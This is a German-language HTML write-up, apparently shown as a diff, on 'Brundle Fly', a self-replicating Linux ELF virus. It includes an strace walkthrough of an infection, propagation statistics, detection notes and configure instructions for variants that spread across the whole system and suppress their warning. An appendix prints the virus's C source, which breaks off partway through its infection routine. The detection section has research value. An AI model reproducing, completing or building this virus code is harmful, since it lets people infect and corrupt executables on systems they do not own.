+<br><tt>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ttys/2&nbsp;&nbsp; 00:07&nbsp; Jul 11 16:31</tt></blockquote>
+Am Beispiel des <tt>strings</tt> Befehl ist eine doppelte Infizierung sichtbar.
+Die Warnung wird hier gleich zweimal ausgegeben und somit auch der Virus
+Code zweimal ausgef&uuml;hrt.
+<br>&nbsp;
+<p><b>4.2 Ein Blick ins Innere</b>
+<p>Um die Arbeitsweise des Virus nicht anhand des Codes zu zeigen, haben
+wir einen kleinen Auszug aus einem System Call Trace des Virus w&auml;hren
+einer Infektion erstellt. Die Funktionsweise wird anhand der System Calls
+deutlich.
+<blockquote><tt># strace /bin/du</tt>
+<br><tt>execve("/bin/du", ["/bin/du"], [/* 29 vars */]) = 0</tt>
+<br><tt>[...]</tt></blockquote>
+Als ersten Schritt pr&uuml;ft BF, ob seine Ausgangsdatei erreichbar ist,
+ist dies nicht der Fall, so besteht keine M&ouml;glichkeit den Virus Code
+aus der Quelle in den Wirt zu Kopieren.
+<blockquote><tt>access("/bin/du", F_OK)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</tt></blockquote>
+Es wird nun mit Hilfe der Zeit ausgew&auml;hlt welches Verzeichnis nach
+m&ouml;gliche Wirten zu durchsuchen ist. In diesem Beispiel wurde das Verzeichnis
+. aus gew&auml;hlt
+<blockquote><tt>time(NULL)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 994869381</tt>
+<br><tt>open("./", O_RDONLY)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 3</tt>
+<br><tt>getdents(3, /* 84 entries */, 4096)&nbsp;&nbsp;&nbsp;&nbsp; = 1452</tt>
+<br><tt>close(3)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</tt></blockquote>
+Nach dem ein Wirt gefunden wurde, wird erst gepr&uuml;ft, ob dieser schreibbar
+und ausf&uuml;hrbar ist, andernfalls bricht der Virus ab. Werden diese
+Bedingungen erf&uuml;llt, so liesst BF seinen eigenen Virus Code aus der
+Quelle ein.
+<blockquote><tt>access("./bash1", W_OK|X_OK)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</tt>
+<br><tt>open("/bin/du", O_RDONLY)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 5</tt>
+<br><tt>lseek(5, 17484, SEEK_SET)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 17484</tt>
+<br><tt>read(5, "\203\354\34UWVS\213|$0\213t$41\355\212\7\4\322&lt;\1w\v\353"...,
+2021) close(5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</tt></blockquote>
+Nun wird das Opfer, der Wirt, untersucht. Die Datei wird ge&ouml;ffnet.
+Zu dem &ouml;ffnet BF auch eine tempor&auml;re Datei ".. ", die als Zwischenspeicher
+dient w&auml;hrend eine Kopie des Wirtes erzeugt wird.&nbsp; Informationen
+&uuml;ber den Wirt werden mittels <tt>fstat()</tt> eingelesen.
+<blockquote><tt>open("./bash1", O_RDONLY)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 5</tt>
+<br><tt>open(".. ", O_WRONLY|O_CREAT, 0600)&nbsp;&nbsp;&nbsp;&nbsp; = 6</tt>
+<br><tt>fstat(5, {st_mode=S_IFREG|0755, st_size=295012, ...}) = 0</tt></blockquote>
+Nach erfolgreichem &Ouml;ffnen des Wirtes, wird dessen ELF Header eingelesen.
+Dies ist deutlich an den ersten 5 Byte zu erkennen.
+<blockquote><tt>read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\2\0\3\0\1\0\0\0d\240\4"...,
+52) = 52</tt></blockquote>
+Jetzt allokiert BF mittel <tt>brk()</tt> dynamischen Speicher auf dem Heap,
+um in diesem die Programm Header Tabelle und die Sektions Header Tabelle
+zu speichern. Beide Tabellen werden dann eingelesen.
+<blockquote><tt>brk(0x804dd48)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0x804dd48</tt>
+<br><tt>lseek(5, 52, SEEK_SET)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 52</tt>
+<br><tt>read(5, "\6\0\0\0004\0\0\0004\200\4\0104\200\4\10\300\0\0\0\300"...,
+192)</tt>
+<br><tt>lseek(5, 293972, SEEK_SET)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 293972</tt>
+<br><tt>read(5, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"...,
+1040)</tt></blockquote>
+Die einzelnen Schritte der Modifikation des Wirtes sind ohne System Calls
+realisiert und lassen sich hier nicht erkennen. Nach dem die ELF Header,
+die Programm Header und Sektions Header Tabellen modifziert sind, wird
+der Virus eingef&uuml;gt und die Datei geschlossen.
+<blockquote><tt>write(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\2\0\3\0\1\0\0\0\330\233"...,
+52) = 52</tt>
+<br><tt>write(6, "\6\0\0\0004\0\0\0004\200\4\0104\200\4\10\300\0\0\0\300"...,
+192) = 192</tt>
+<br><tt>[...]</tt>
+<br><tt>close(5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 5</tt></blockquote>
+Abschliessend wird die tempor&auml;re Datei ".. " in das Original umgewandelt.
+Die Benutzerrechte als auch der Benutzer werden vom originalen Wirt &uuml;bernommen.
+<blockquote><tt>rename(".. ", "./bash1")&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</tt>
+<br><tt>fchmod(6, 037777700755)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</tt>
+<br><tt>fchown(6, 0, 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</tt>
+<br><tt>close(6)</tt></blockquote>
+Hier ist nur der Befall einer Datei dargestellt in unserem tats&auml;chlichen
+Durchlauf wurden 24 Dateien w&auml;hrend einer einzigen Ausf&uuml;hrung
+befallen, obwohl nur 45% jeder dritten Datei verwendeten wurde (Siehe Ausbreitungsrate)</blockquote>
+<b>5 Weitere Informationen</b>
+<blockquote><b>5.1 Ausbreitungsrate</b>
+<p>Das Script <tt>cnthosts</tt> erm&ouml;glicht es zu pr&uuml;fen wieviel
+Dateien BF auf einem System infizieren kann. Da ja das Textsegment genug
+Platz enthalten muss, erreicht BF nur eine Quote von 45% auf einem normalen
+Slackware Linux 7.x.
+<blockquote><tt>$ cd src</tt>
+<br><tt>$ make stats</tt>
+<br><tt>./cnthosts /usr/bin /bin /usr/local/bin /usr/sbin</tt>
+<p><tt>This script would like to scan the following directories for files</tt>
+<br><tt>that represent potential hosts for the brundly-fly virus. It will</tt>
+<br><tt>not inject the virus. It will calculate some statistics.</tt>
+<p><tt>/usr/bin /bin /usr/local/bin /usr/sbin</tt>
+<p><tt>Is this okay [y/n]: y</tt>
+<p><tt>Counting possible hosts</tt>
+<br><tt>.....o.......ooo.........oooo...o..o.....o..o.o....oo..o.o...o.....</tt>
+<br><tt>..oo..o.o.o.ooo..ooooo.....oo.o.o.o...o...o.o..o...oooo...ooo......</tt>
+<br><tt>.o.oo..ooo.o.oooo...oo..ooo.......ooooo.....o.........o.o.....o..oo</tt>
+<br><tt>..ooo.o.ooooo.oo...oooo...o..o.o.o.ooo.oooo..o.o..o.oo.o....oooo...</tt>
+<br><tt>.....ooo.o..o.o.o..ooo...o.......oo.oo.o....oo.oooo.o.o..o.o.o.o...</tt>
+<br><tt>....ooo..oo.oo.oo.ooo..o.oooo.o.oo..o.o.o..oo.o...o.oooooo......o..</tt>
+<br><tt>.o..o...ooo...o.o.oo.ooo.oooo....o...o...o*.ooooo.oooo.ooo.ooo....o</tt>
+<br><tt>o.ooo.o...o...oo.....oo.oooooo.ooo..o..oo..oo.o*o.oo....o.oo.*.o...</tt>
+<br><tt>o..o..o.o..oo.ooooo.oo...ooo..o.o.oo..o.....o...oo......o..oo.o.o..</tt>
+<br><tt>.ooooo..o..o..ooo.ooooo.oo.oooo...ooo..o.ooo.*</tt>
+<p><tt>329 binaries could be infected.</tt>
+<br><tt>388 binaries could not be infected.</tt>
+<br><tt>Percentage: 45%</tt></blockquote>
+Es ergibt sich so eine Vermehrungsrate von 1/3 * 0.45, da BF nur jede dritte
+Datei bef&auml;llt. Wie allerdings der obige Vermehrungstest zeigt, ist
+dennoch die Wirkung von BF fatal. Sein Wachstum ist zudem exponential.
+<br>&nbsp;
+<p><b>5.2 Viruserkennung</b>
+<p>Der BF Virus l&auml;&szlig;t sich rein technisch relativ einfach erkennen.
+In Dateien die Debug Informationen enthalten, f&uuml;hrt das Einf&uuml;gen
+des Virus zu einem Chaos innerhalb dieser Informationen. Jeder Debugger
+erkennt die korrupten Debug Symbole und sollte eine Warnung erzeugen.
+<p>Sind die Dateien allerdings gestrippt, so stellt sich die Erkennung
+nicht ganz so einfach dar. Typischerweise befinden sich allerdings bei
+fast allen ELF Programmen die Startpunkte des Codes innerhalb des Anfangs
+des Textsegments, ein Sprung an den Ende des Segments wie bei BF ist untypisch.
+BF enth&auml;lt zudem sehr einfach zuerkennende festkodierte Zeichenketten
+wie "../../." oder "/usr/bin:/bin", diese sollten in mehreren Programmen
+innerhalb eines Verzeichnisses nicht enthalten sein. Der Code selbst sollte
+auch eine gute Signatur liefern.
+<p>Obwohl die von uns verwendeten Techniken nicht neu sind, sondern von
+den 4 existierenden Linux Viren, Bliss, VIT und Siilov entstammen,&nbsp;
+war das einzige Anti-Viren Programm, das nicht als RPM vorlag, nicht in
+der Lage den Virus zu identifizieren.
+<blockquote><tt># sweep /home/seth</tt>
+<br><tt>SWEEP virus detection utility</tt>
+<br><tt>Version 3.47, July 2001 [Linux/Intel]</tt>
+<br><tt>Includes detection for 64894 viruses, trojans and worms</tt>
+<br><tt>Copyright (c) 1989,2001 Sophos Plc, www.sophos.com</tt>
+<p><tt>System time 01:09:34, System date 10 July 2001</tt>
+<p><tt>Quick Sweeping</tt>
+<p><tt>157 files swept in 8 seconds.</tt>
+<br><tt>No viruses were discovered.</tt>
+<br><tt>End of Sweep.</tt></blockquote>
+Viele Linux Anti-Viren Programme waren nur kommerziell erh&auml;ltlich
+oder in dem f&uuml;r Slackware leider etwas unbrauchbaren RPM Format.
+<br>&nbsp;
+<p><b>5.3 Neukompilierung</b>
+<p>BF benutzt die GNU Configure Tools. Eine Kompilierung ist daher denkbar
+einfach:
+<blockquote><tt>$ tar -zxvf brundle-fly-0.0.1.tar.gz</tt>
+<br><tt>$ cd brundle-fly-0.0.1</tt>
+<br><tt>$ ./configure</tt>
+<br><tt>$ make</tt></blockquote>
+Neben anderen Configure Switches, stehen zwei besondere Varianten zur Verf&uuml;gung,
+die es erlauben die in der Einleitung beschriebenen Varianten von BF zu
+erzeugen. Bei der Verwendung von keinen Configure Switches wird die Version
+<tt>brundle-fly-default
+e</tt>rstellt.
+<blockquote><tt>--with-propagation</tt>
+<br>Ist dieser Switch gesetzt, so wird BF so konfiguriert, dass er sich
+selbst innerhalb des Systems repliziert, diese Version ist also deutlich
+gef&auml;hrlicher als die Default Version, die nur eine Datei bef&auml;llt.
+Vorsicht!
+<p><tt>--with-no-warning</tt>
+<br>Ist dieser Switch und der vorherige gesetzt, so entsteht die b&ouml;sartigste
+Variante von BF. Der so erzeugte Virus repliziert sich &uuml;ber das ganze
+System und gibt keine Warnung aus. Mehr als Vorsicht!</blockquote>
+BF nutzt das geschickte Zusammenspiel von GNU C Compiler, Assembler und
+Linker. Leider verhalten sich unterschiedliche Versionen auch sehr unterschiedlich
+und es kann passieren, dass der erstellte Virus unbrauchbar ist. Ein typisches
+Zeichen hief&uuml;r ist die Fehlermeldung "<tt>illegal instruction</tt>".
+Um sicher zu gehen empfehlen wir eine der folgenden Konfigurationen, die
+gute Resultat lieferen (Allerdings war der Virus auf jedem System unerschiedlich
+gro&szlig; und der Code nicht identisch!)
+<blockquote><tt>&nbsp;- Linux kernel 2.4.5, gcc 2.95.3, as 2.9.1, ld 2.9.1</tt>
+<br><tt>&nbsp;- Linux kernel 2.4.3, gcc 2.95.4, as 2.11.90.0.7, ld 2.11.90.0.7</tt>
+<br><tt>&nbsp;- Linux kernel 2.2.17, gcc 2.95.2, as 2.9.5, ld 2.9.5</tt></blockquote>
+Auf anderen Systemen ist erst die Default Version zu erstellen und diese
+mittels <tt>strace</tt> zu testen, funktioniert diese einwandfrei so lassen
+sich auch die beiden anderen erzeugen.
+<p><b>5.4 Weiteres</b>
+<p>Auf Grund des Umfanges konnten wir nicht auf alle kleinen Details von
+BF eingehen, es empfiehlt sich also ein Blick in den Code - gut dokumentiert
+sollte er sein.
+<p>Wie jedes gute Programm ist auch Brundle Fly mit einer Widmung ausgestattet.
+Das Projekt ist Seth Brundle gewidmet, der tragischen-komischen Figur des
+Wissenschaftlers aus dem Remake von "The Fly".
+<p>Konrad Rieck &amp; Konrad Kretschmer
+<br>12.7.2001</blockquote>
+
+<br>&nbsp;
+<p><b>Anhang</b>
+<blockquote>Es folgt der C Code von Brundle Fly enthalten in der Datei
+<tt>brundle-fly-proto.c</tt>.
+<pre>
+<tt>/*
+&nbsp;* Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
+&nbsp;* Copyright 2001 Konrad Rieck &lt;kr@r0q.cx>, Konrad Kretschmer &lt;kk@r0q.cx>
+&nbsp;* In memory to Seth Brundle&nbsp;
+&nbsp;*
+&nbsp;* This file is the actual Brundle Fly virus. It performs the replication.
+&nbsp;* Read through the source in order to find all important parts of the&nbsp;
+&nbsp;* code.&nbsp;&nbsp;
+&nbsp;*
+&nbsp;* $Id: brundle-fly.html,v 1.1.1.1 2004/03/29 18:58:17 kr Exp $
+&nbsp;*/
+
+#include &lt;sys/types.h>
+#include &lt;config.h>
+#include &lt;structs.h>
+#include &lt;syscalls.h>
+#include &lt;brundle-fly.h>
+#include &lt;elfio.h>
+
+/*
+&nbsp;* A simple function that tries to find the binary filename in the
+&nbsp;* hard-coded path given by path_env. A temporary space tmp has to be
+&nbsp;* provided in order to construct the different paths.&nbsp;
+&nbsp;*/
+char *get_path(char *filename, char *tmp, char *path_env)
+{
+&nbsp;&nbsp;&nbsp; char *p, *t, *f;
+&nbsp;&nbsp;&nbsp; int i, found = 0;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * If the filename starts with / or . return.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (*filename == '/' || *filename == '.')
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return filename;
+
+&nbsp;&nbsp;&nbsp; p = path_env;
+
+&nbsp;&nbsp;&nbsp; while (!found &amp;&amp; *p != 0) {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t = tmp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f = filename;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * Add a path from path_env to t
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (; *p != ':'; p++, t++)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *t = *p;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * Append the filename f to t
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (; *f != 0; f++, t++)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *t = *f;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *t = 0;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * Check if the constructed filename exists
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (access(tmp, F_OK) > -1)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return tmp;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p++;
+&nbsp;&nbsp;&nbsp; }
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * If the file could not be found the given paths return the&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * original filename.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; return filename;
+}
+
+/*&nbsp;
+&nbsp;* This functions copies len bytes from src to dst. It doesn't keep track
+&nbsp;* of the file position pointers, lseek() instruction have to be issued
+&nbsp;* before calling copy().
+&nbsp;*/
+void copy(int src, int dst, size_t len)
+{
+&nbsp;&nbsp;&nbsp; int i, r = PAGE_SIZE;
+&nbsp;&nbsp;&nbsp; char buf[PAGE_SIZE];
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Use chunks of PAGE_SIZE for copying in order to avoid dynamic
+&nbsp;&nbsp;&nbsp;&nbsp; * memory allocation.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; for (i = len; i > 0; i -= PAGE_SIZE) {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (i &lt; PAGE_SIZE)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = i;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(src, buf, r);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(dst, buf, r);
+&nbsp;&nbsp;&nbsp; }
+}
+
+/*
+&nbsp;* This is the workhorse of Brundle Fly. It infects host by the virus&nbsp;
+&nbsp;* included in source. The file tmp is used to construct the copy and
+&nbsp;* at the end moved to the host filename.&nbsp;
+&nbsp;*/
+int inject(char *host, char *source, char *tmp)
+{
+&nbsp;&nbsp;&nbsp; int src, dst, i;
+&nbsp;&nbsp;&nbsp; unsigned long shdrs_len, phdrs_len, virt_start;
+&nbsp;&nbsp;&nbsp; unsigned long real_start, secstart, position;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * These five values have to patched after the virus has been compiled.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * They include information about the compiled virus, such as where it
+&nbsp;&nbsp;&nbsp;&nbsp; * starts (virus_start), where the host should enter virus
+&nbsp;&nbsp;&nbsp;&nbsp; * (virus_entry), where the virus has to jump after execution
+&nbsp;&nbsp;&nbsp;&nbsp; * (host_entry), the virus length (virus_length) and the offset of the
+&nbsp;&nbsp;&nbsp;&nbsp; * virus_start field (virus_start_off).
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; unsigned long virus_entry = 0xabcdabcd;
+&nbsp;&nbsp;&nbsp; unsigned long host_entry = 0xfeedfeed;
+&nbsp;&nbsp;&nbsp; unsigned long virus_length = 0xbefabefa;
+&nbsp;&nbsp;&nbsp; unsigned long virus_start = 0xfacafaca;
+&nbsp;&nbsp;&nbsp; int virus_start_off = 0xfaabfaab;
+
+&nbsp;&nbsp;&nbsp; char virus_data[PAGE_SIZE];
+
+&nbsp;&nbsp;&nbsp; Elf_Phdr *phdrs, *ptmp;
+&nbsp;&nbsp;&nbsp; Elf_Shdr *shdrs, *stmp;
+&nbsp;&nbsp;&nbsp; Elf_Ehdr ehdr;
+&nbsp;&nbsp;&nbsp; struct stat st;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Check we have write permission and the host is executable. Brundle
+&nbsp;&nbsp;&nbsp;&nbsp; * Fly can also infect libraries since those are relatively equaly to
+&nbsp;&nbsp;&nbsp;&nbsp; * executable binaries. Remove the X_OK check to infect libraries.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (access(host, X_OK | W_OK | F_OK) &lt; 0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Open the source file and copy the complete virus to the array
+&nbsp;&nbsp;&nbsp;&nbsp; * virus_data. As you can see we use virus_start and virus_length.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * That's why they need to be patched later (elf2bin).&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; src = open(source, O_RDONLY, 0);
+&nbsp;&nbsp;&nbsp; lseek(src, virus_start, SEEK_SET);
+&nbsp;&nbsp;&nbsp; read(src, virus_data, virus_length);
+&nbsp;&nbsp;&nbsp; close(src);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Open the host file and the tmp file. If this is not possible,
+&nbsp;&nbsp;&nbsp;&nbsp; * be a good boy and return.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if ((src = open(host, O_RDONLY, 0)) &lt; 0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+&nbsp;&nbsp;&nbsp; if ((dst = open(tmp, O_WRONLY | O_CREAT, 0600)) &lt; 0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Retrieve stats about the host file. We will later need the host
+&nbsp;&nbsp;&nbsp;&nbsp; * file size, its modes and its owner.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (fstat(src, &amp;st) &lt; 0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Read the ELF header in to memory. The ehdr struct is on the stack,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * therefore we don't need to care for dynamic memory.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (read(src, (char *) &amp;ehdr, sizeof(Elf_Ehdr)) &lt; sizeof(Elf_Ehdr))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Check if this really is an ELF file, that is either exectuable
+&nbsp;&nbsp;&nbsp;&nbsp; * or includes dynamically linkable code. Last but not least check
+&nbsp;&nbsp;&nbsp;&nbsp; * if this is really i386 code, we don't want to play with those&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * SPARC / MIPS / ... Linux freaks.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (ehdr.e_ident[0] != ELFMAG0 || ehdr.e_ident[1] != ELFMAG1 ||
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ehdr.e_ident[2] != ELFMAG2 || ehdr.e_ident[3] != ELFMAG3 ||
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ehdr.e_type != ET_EXEC &amp;&amp; ehdr.e_type != ET_DYN) ||
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ehdr.e_machine != EM_386)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; shdrs_len = sizeof(Elf_Shdr) * ehdr.e_shnum;
+&nbsp;&nbsp;&nbsp; phdrs_len = sizeof(Elf_Phdr) * ehdr.e_phnum;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * After calculating the size for the section and the program headers,
+&nbsp;&nbsp;&nbsp;&nbsp; * we need to allocate the necessary memory. Brundle Fly is optimised
+&nbsp;&nbsp;&nbsp;&nbsp; * for size, virt_start is used as a temporary variable don't get
+&nbsp;&nbsp;&nbsp;&nbsp; * confused.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; virt_start = brk(0);
+&nbsp;&nbsp;&nbsp; i = virt_start + shdrs_len + phdrs_len;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * If for some reason, we cannot allocate the memory, we leave
+&nbsp;&nbsp;&nbsp;&nbsp; * everything behind, working with not allocated memory causes
+&nbsp;&nbsp;&nbsp;&nbsp; * suspicious segmentation faults.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (brk(i) != i)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * We set the both pointers to our new allocated memory.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; phdrs = (Elf_Phdr *) virt_start;
+&nbsp;&nbsp;&nbsp; shdrs = (Elf_Shdr *) (virt_start + phdrs_len);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Now it's time to read in the program and section headers. We are not
+&nbsp;&nbsp;&nbsp;&nbsp; * checking for errors. In case something goes wrong from this point on,
+&nbsp;&nbsp;&nbsp;&nbsp; * erhm, bad luck!
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; lseek(src, ehdr.e_phoff, SEEK_SET);
